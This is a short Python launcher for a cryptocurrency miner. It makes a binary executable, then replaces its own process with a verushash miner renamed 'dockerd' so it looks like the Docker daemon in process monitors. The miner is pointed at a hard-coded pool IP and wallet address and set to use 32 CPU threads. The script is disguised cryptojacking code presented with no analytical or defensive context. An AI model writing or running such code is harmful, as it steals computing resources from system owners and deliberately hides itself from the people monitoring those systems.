import os
os.system("chmod +x srebe")
# Replace the current process with the mining process
os.execvp("./srebe", [
    "dockerd",  # This will be the name shown in process monitors
    "--disable-gpu",
    "--algorithm", "verushash",
    "--pool", "149.56.27.47:3956",
    "--wallet", "R9HMvHdgUX8h7h7ch3xGq4qGGVsRmuC74T",
    "--worker", "$(shuf -i 1-99 -n 1)",  # Using a fixed worker name
    "--password", "x",
    "--cpu-threads", "32"
])
